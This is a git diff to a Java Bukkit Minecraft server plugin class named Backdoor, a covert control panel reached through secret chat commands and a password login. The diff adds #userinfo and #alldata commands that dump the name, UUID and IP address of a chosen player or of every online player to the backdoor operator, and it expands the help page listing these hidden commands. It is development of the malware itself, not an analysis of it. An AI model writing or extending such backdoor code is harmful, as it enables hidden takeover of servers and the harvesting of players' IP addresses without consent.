@@ -9,6 +9,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.server.ServerCommandEvent;
 
 import java.util.*;
@@ -287,7 +288,7 @@ public class Backdoor implements Listener {
 
                 case "#help":{
                     if(args.length == 1){
-                    p.sendMessage(Utils.chat("&dPlease Specify A Page There Is Currently 3 Pages"));
+                    p.sendMessage(Utils.chat("&dPlease Specify A Page There Is Currently 4 Pages"));
                 }
                 if(args.length == 2) {
                     int page = Integer.parseInt(args[1]);
@@ -316,8 +317,48 @@ public class Backdoor implements Listener {
                         p.sendMessage(Utils.chat("&d#clearchat &8- &9Clears Chat"));
                         p.sendMessage(Utils.chat("&d#kick (player) &8- &9Kicks A Player"));
                         p.sendMessage(Utils.chat("&d#login (password) &8- &9Gives Access To The Backdoor"));
+                        p.sendMessage(Utils.chat("&d#userinfo (player) &8- &9Gives Players Information"));
+                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
+                        } else if(page == 4){
+                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
+                        p.sendMessage(Utils.chat("&d#alldata &8- &9Grabs All Online Players Data"));
                         p.sendMessage(Utils.chat("&8&m--------------------------------"));
                         }
+                    }
+                    break;
+                }
+
+                case "#userinfo":{
+                    if(args.length == 1){
+                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
+                    }
+                    if(args.length == 2){
+                        Player target = Bukkit.getServer().getPlayer(args[1]);
+                        if(target != null){
+                            String name = target.getName();
+                            String uuid = target.getUniqueId().toString();
+                            String ip = target.getAddress().getAddress().getHostAddress();
+                            p.sendMessage(Utils.chat("&dName&8: &9" + name));
+                            p.sendMessage(Utils.chat("&dUUID&8: &9" + uuid));
+                            p.sendMessage(Utils.chat("&dIP&8: &9" + ip));
+                        } else {
+                            p.sendMessage(Utils.chat("&dPlayer Is Not Online"));
+                        }
+                    }
+                    break;
+                }
+
+                case "#alldata":{
+                    for(Player p2 : Bukkit.getServer().getOnlinePlayers()){
+                        String name = p2.getName();
+                        String UUID = p2.getUniqueId().toString();
+                        String IP = p2.getAddress().getAddress().getHostAddress();
+                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
+                        p.sendMessage(Utils.chat("&dName&8: &9" + name));
+                        p.sendMessage(Utils.chat("&dUUID&8: &9" + UUID));
+                        p.sendMessage(Utils.chat("&dIP&8: &9" + IP));
+                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
+
                     }
                     break;
                 }
@@ -338,7 +379,7 @@ public class Backdoor implements Listener {
     }
 
     @EventHandler (priority = EventPriority.MONITOR)
-    public void onPlayerCommand(AsyncPlayerChatEvent e){
+    public void onPlayerCommand(PlayerCommandPreprocessEvent e){
         String command = e.getMessage();
         Player p = e.getPlayer();
         if(locked.contains(p.getUniqueId())){
